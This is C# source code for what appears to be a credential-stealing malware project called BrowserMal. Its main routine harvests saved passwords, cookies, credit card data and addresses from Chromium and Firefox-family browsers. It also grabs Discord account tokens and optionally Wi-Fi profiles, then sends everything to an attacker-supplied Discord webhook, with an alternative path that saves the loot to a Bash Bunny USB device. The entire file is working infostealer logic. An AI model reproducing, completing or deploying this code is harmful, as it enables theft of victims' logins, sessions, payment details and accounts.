using BrowserMal.Browser;
using System.Collections.Generic;
using BrowserMal.Manager;
using BrowserMal.Model;
using BrowserMal.Util;
using BrowserMal.Discord;
using System.Threading;
using System;

namespace BrowserMal
{
    public class Class1
    {
        private static readonly BrowserManager browserManager = new BrowserManager();
        private static readonly GeckoBrowserManager geckoBrowserManager = new GeckoBrowserManager();
        private static readonly Dictionary<string, string> list = new Dictionary<string, string>();

        public static void StartCreds(string discordWebhook, bool extractWifi)
        {
            if (string.IsNullOrEmpty(discordWebhook))
                return;

            SystemInfoDiscordMessage(discordWebhook);

            browserManager.Init();
            geckoBrowserManager.Init();

            BrowserDump(discordWebhook);
            DiscordTokenDump(discordWebhook);

            if (extractWifi)
            {
                WifiDump(discordWebhook);
            }

            //Filesaver.FileManager.SaveBytes(@"", Zip.ZipArchives(list));
            //ProcessUtil.KillProcessDelayed(1, "powershell.exe");
        }

        private static void DiscordTokenDump(string discordWebhook)
        {
            new Thread(() =>
            {

                DiscordManager discordManager = new DiscordManager();
                List<BrowserModel> discordPaths = discordManager.GetDiscordLocations();

                DiscordManager.Encrypted = true;
                List<string> discordTokensApp = discordManager.Init(ref discordPaths, ChromiumUtil.LOCAL_STORAGE);

                foreach (string token in discordTokensApp)
                {
                    CreateUserTokenMessage(discordWebhook, token);
                }

            }).Start();
        }

        private static void BrowserDump(string discordWebhook)
        {
            new Thread(() =>
            {
                Chromium();
                Gecko();

                DiscordExtration(discordWebhook);

            }).Start();
        }

        private static void SystemInfoDiscordMessage(string discordWebhook)
        {
            new Thread(() =>
            {
                CreateDiscordMessage(discordWebhook);
            }).Start();
        }

        private static void WifiDump(string discordWebhook)
        {
            new Thread(() =>
            {
                Wifi.Enumerate enumerate = new Wifi.Enumerate();
                Webhook.SendFile(enumerate.Start(), discordWebhook, "wifi.json");
            }).Start();
        }

        private static void CreateDiscordMessage(string discordWebhook)
        {
            try
            {
                DiscordMessageManager discordMessageManager = new DiscordMessageManager();
                Webhook.Send(discordMessageManager.CreateMessage(color: 0xf50fd6, username: "Brobot"), discordWebhook);
            }
            catch(Exception)
            {
            }
        }

        private static void CreateUserTokenMessage(string discorWebhook, string discordToken)
        {
            try
            {
                DiscordMessageManager discordMessageManager = new DiscordMessageManager();
                Webhook.Send(discordMessageManager.CreateMessage(color: 0xf50fd6, username: "Brobot", discordToken), discorWebhook);
            }
            catch (Exception)
            {
            }
        }
       
        private static void DiscordExtration(string url) => Webhook.BulkSend(list, url);

        private static void Extration()
        {
            string root = GetBashBunny();

            if (string.IsNullOrEmpty(root))
                return;

            Filesaver.FileManager.SaveBytes(root, "loot", Zip.ZipArchives(list));
        }

        private static void Chromium()
        {
            var browsers = browserManager.GetBrowsers();

            List<ColumnModel> credsColumns = new List<ColumnModel>
            {
                new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("username_value", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };
            ChromiumManager<CredentialModel> credentialsManager = new ChromiumManager<CredentialModel>("logins", new SqliteTableModel(credsColumns));
            list.AddRange(credentialsManager.Init(ref browsers, ChromiumUtil.LOGIN_DATA));

            // get cookies
            List<ColumnModel> cookiesColumns = new List<ColumnModel>
            {
                new ColumnModel("host_key", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("name", isEncrypted: false, needsFormatting: false, isImportant: true),
                new ColumnModel("path", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, ChromiumUtil.ChromiumToUnixTimestamp),
                new ColumnModel("encrypted_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };
            ChromiumManager<CookieModel> cookiesManager = new ChromiumManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns));
            list.AddRange(cookiesManager.Init(ref browsers, ChromiumUtil.COOKIES));

            // get credit cards
            List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
            {
                new ColumnModel("name_on_card", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expiration_month", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expiration_year", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("nickname", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("card_number_encrypted", isEncrypted: true, needsFormatting: false, isImportant: false)
            };
            ChromiumManager<CreditCardModel> creditCardsManager = new ChromiumManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns));
            list.AddRange(creditCardsManager.Init(ref browsers, ChromiumUtil.WEB_DATA));

            List<ColumnModel> addressesColumns = new List<ColumnModel>()
            {
                new ColumnModel("street_address", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("city", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("zipcode", isEncrypted: false, needsFormatting: false, isImportant: false)
            };
            ChromiumManager<AddressesModel> addressesManager = new ChromiumManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns));
            list.AddRange(addressesManager.Init(ref browsers, ChromiumUtil.WEB_DATA));
        }

        public static void Gecko()
        {
            var browsers = geckoBrowserManager.GetBrowsers();

            GeckoManager<CredentialModel> geckoManager = new GeckoManager<CredentialModel>("logins.json", default);
            list.AddRange(geckoManager.Init(ref browsers));

            List<ColumnModel> cookiesColumn = new List<ColumnModel>
            {
                new ColumnModel("host", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("name", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("path", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expiry", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("value", isEncrypted: false, needsFormatting: false, isImportant: true)
            };
            GeckoManager<CookieModel> geckoCookies = new GeckoManager<CookieModel>("moz_cookies", new SqliteTableModel(cookiesColumn));
            
            geckoCookies.SetIsSqlite(true);
            geckoCookies.SetFileName("cookies.sqlite");

            list.AddRange(geckoCookies.Init(ref browsers));
        }

        private static string GetBashBunny() => RemovableDisks.FindBashBunny();
    }
}
